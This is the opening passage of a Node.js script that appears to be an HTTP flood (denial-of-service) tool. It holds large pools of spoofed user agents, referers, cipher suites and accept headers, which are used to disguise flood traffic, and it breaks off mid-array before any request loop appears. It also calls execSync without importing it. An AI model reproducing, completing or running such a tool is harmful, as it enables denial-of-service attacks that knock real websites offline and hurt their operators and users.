// HTTP RAW ? HAHA
const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  tls = require('tls'),
  net = require('net'),
  request = require('request'),
  cluster = require('cluster'),
  fakeua = require('fake-useragent'),
  randstr = require('randomstring'),
  crypto = require('crypto'),
  currentTime = new Date(),
  httpTime = currentTime['toUTCString'](),
  randomString = crypto['randomBytes'](20)['toString']('hex'),
  secretKey = crypto['randomBytes'](32);
var ciphe = crypto['createCipheriv']('aes-256-cbc', secretKey, crypto['randomBytes'](16));
let encrypted = ciphe['update'](randomString, 'utf8', 'hex');
encrypted += ciphe['final']('hex');
const cookieValue = encrypted,
  bytes = crypto['randomBytes'](16),
  xAuthToken = bytes['toString']('hex');
try {
  var colors = require('colors');
} catch (_0x3f2855) {
  console['log']('[36mInstalling[37m the requirements'), execSync('npm install colors'), console['log']('Done.'), process['exit']();
}
const uap = ['POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1', 'POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1', 'portalmmm/2.0 N410i(c20;TB) ', 'Python-urllib/2.5', 'SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3', 'SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)', 'SearchExpress', 'SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)', 'SEC-SGHX210/1.0 UP.Link/6.3.1.13.0', 'SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0', 'SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonT100/R101', 'Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00', 'Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10', 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01', 'Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10', 'Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30', 'SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0', 'SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonT68/R201A', 'SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]', 'SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0', 'SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102', 'BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123', 'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'],
  fetch_site = ['same-origin', 'same-site', 'cross-site', 'none'],
  type = ['text/plain', 'text/html', 'application/json', 'application/xml', 'multipart/form-data', 'application/octet-stream', 'image/jpeg', 'image/png', 'audio/mpeg', 'video/mp4', 'application/javascript', 'application/pdf', 'application/vnd.ms-excel', 'application/vnd.ms-powerpoint', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/zip', 'image/gif', 'image/bmp', 'image/tiff', 'audio/wav', 'audio/midi', 'video/avi', 'video/mpeg', 'video/quicktime', 'text/csv', 'text/xml', 'text/css', 'text/javascript', 'application/graphql', 'application/x-www-form-urlencoded', 'application/vnd.api+json', 'application/ld+json', 'application/x-pkcs12', 'application/x-pkcs7-certificates', 'application/x-pkcs7-certreqresp', 'application/x-pem-file', 'application/x-x509-ca-cert', 'application/x-x509-user-cert', 'application/x-x509-server-cert', 'application/x-bzip', 'application/x-gzip', 'application/x-7z-compressed', 'application/x-rar-compressed', 'application/x-shockwave-flash'],
  referer = ['https://www.google.com', 'https://www.facebook.com', 'https://www.twitter.com', 'https://www.youtube.com', 'https://www.amazon.com', 'https://www.netflix.com', 'https://www.instagram.com', 'https://www.yahoo.com', 'https://www.stackoverflow.com', 'https://www.github.com', 'https://www.linkedin.com', 'https://www.cnn.com', 'https://www.apple.com', 'https://www.microsoft.com', 'https://www.wikipedia.org', 'https://www.nytimes.com', 'https://www.msn.com', 'https://www.reddit.com', 'https://www.quora.com', 'https://www.npr.org', 'https://www.bbc.com', 'https://www.theguardian.com', 'https://www.huffingtonpost.com', 'https://www.washingtonpost.com', 'https://www.wsj.com', 'https://www.bloomberg.com', 'https://www.cnbc.com', 'https://www.merriam-webster.com', 'https://www.dictionary.com', 'https://www.thedailybeast.com', 'https://www.thedailyshow.com', 'https://www.colbertnation.com', 'https://www.nationalgeographic.com', 'https://www.nasa.gov', 'https://www.nypl.org', 'https://www.britannica.com', 'https://www.healthline.com', 'https://www.webmd.com', 'https://www.mayoclinic.org', 'https://www.cdc.gov', 'https://www.nih.gov', 'https://www.medlineplus.gov', 'https://www.cancer.gov', 'https://www.fda.gov', 'https://www.nature.com', 'https://www.sciencemag.org', 'https://www.scientificamerican.com', 'https://www.who.int', 'https://www.un.org', 'https://www.worldbank.org', 'https://www.imf.org', 'https://www.wto.org', 'https://www.oecd.org', 'https://www.europa.eu', 'https://www.nato.int', 'https://www.icrc.org', 'https://www.amnesty.org', 'https://www.hrw.org', 'https://www.greenpeace.org', 'https://www.oxfam.org', 'https://www.doctorswithoutborders.org', 'https://www.unicef.org', 'https://www.savethechildren.org', 'https://www.redcross.org', 'https://www.wikipedia.org', 'https://www.wikimedia.org', 'https://www.mozilla.org', 'https://www.apache.org', 'https://www.mysql.com', 'https://www.php.net', 'https://www.python.org', 'https://www.ruby-lang.org', 'https://www.jquery.com', 'https://www.reactjs.org', 'https://www.angularjs.org', 'https://www.vuejs.org', 'https://www.bootstrap.com', 'https://www.materializecss.com', 'https://www.sass-lang.com', 'https://www.lesscss.org', 'https://www.d3js.org', 'https://www.highcharts.com', 'https://www.chartjs.org', 'https://www.mapbox.com', 'https://www.mapboxgl-js.com', 'https://www.openstreetmap.org', 'https://www.mapbox.com', 'https://www.mapboxgl-js.com', 'https://www.chartjs.org', 'https://www.highcharts.com', 'https://www.d3js.org', 'https://www.lesscss.org', 'https://www.sass-lang.com', 'https://www.materializecss.com', 'https://www.bootstrap.com', 'https://www.vuejs.org', 'https://www.angularjs.org', 'https://www.reactjs.org', 'https://www.jquery.com', 'https://www.ruby-lang.org', 'https://www.python.org', 'https://www.php.net', 'https://www.mysql.com', 'https://www.apache.org', 'https://www.mozilla.org', 'https://www.wikimedia.org', 'https://www.wikipedia.org', 'https://www.redcross.org', 'https://www.savethechildren.org', 'https://www.unicef.org', 'https://www.doctorswithoutborders.org', 'https://www.oxfam.org', 'https://www.greenpeace.org', 'https://www.hrw.org', 'https://www.amnesty.org', 'https://www.icrc.org', 'https://www.nato.int', 'https://www.europa.eu', 'https://www.oecd.org', 'https://www.wto.org', 'https://www.imf.org', 'https://www.worldbank.org', 'https://www.un.org', 'https://www.who.int', 'https://www.scientificamerican.com', 'https://www.sciencemag.org', 'https://www.nature.com', 'https://www.fda.gov', 'https://www.cancer.gov', 'https://www.medlineplus.gov', 'https://www.nih.gov', 'https://www.cdc.gov', 'https://www.mayoclinic.org', 'https://www.webmd.com', 'https://www.healthline.com', 'https://www.britannica.com', 'https://www.nypl.org', 'https://www.nasa.gov', 'https://www.nationalgeographic.com', 'https://www.colbertnation.com', 'https://www.thedailyshow.com', 'https://www.thedailybeast.com', 'https://www.dictionary.com', 'https://www.merriam-webster.com', 'https://www.cnbc.com', 'https://www.bloomberg.com', 'https://www.wsj.com', 'https://www.washingtonpost.com', 'https://www.huffingtonpost.com', 'https://www.theguardian.com', 'https://www.bbc.com', 'https://www.npr.org', 'https://www.quora.com', 'https://www.reddit.com', 'https://www.msn.com', 'https://www.nytimes.com', 'https://www.wikipedia.org', 'https://www.microsoft.com', 'https://www.apple.com', 'https://www.cnn.com', 'https://www.linkedin.com', 'https://www.github.com', 'https://www.stackoverflow.com', 'https://www.yahoo.com', 'https://www.instagram.com', 'https://www.netflix.com', 'https://www.amazon.com', 'https://www.youtube.com', 'https://www.twitter.com', 'https://www.facebook.com', 'https://www.google.com'],
  platform = ['Windows', 'Windows Phone', 'Macintosh', 'Linux', 'iOS', 'Android', 'PlayStation 4', 'Xbox One', 'Nintendo Switch', 'Apple TV', 'Amazon Fire TV', 'Roku', 'Chromecast', 'Smart TV', 'Other'];
cplist = ['RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', 'TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', 'TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', 'TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', 'TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-SHA256', 'ECDHE-RSA-AES128-SHA256', 'ECDHE-ECDSA-AES256-SHA384', 'ECDHE-RSA-AES256-SHA384', 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-SHA256', 'ECDHE-RSA-AES128-SHA256', 'ECDHE-ECDSA-AES256-SHA384', 'ECDHE-RSA-AES256-SHA384', 'ECDHE-ECDSA-AES128-SHA', 'ECDHE-RSA-AES128-SHA', 'AES128-GCM-SHA256', 'AES128-SHA256', 'AES128-SHA', 'ECDHE-RSA-AES256-SHA', 'AES256-GCM-SHA384', 'AES256-SHA256', 'AES256-SHA', 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA', 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL', 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA', 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL', 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA', ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'];
const accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain', 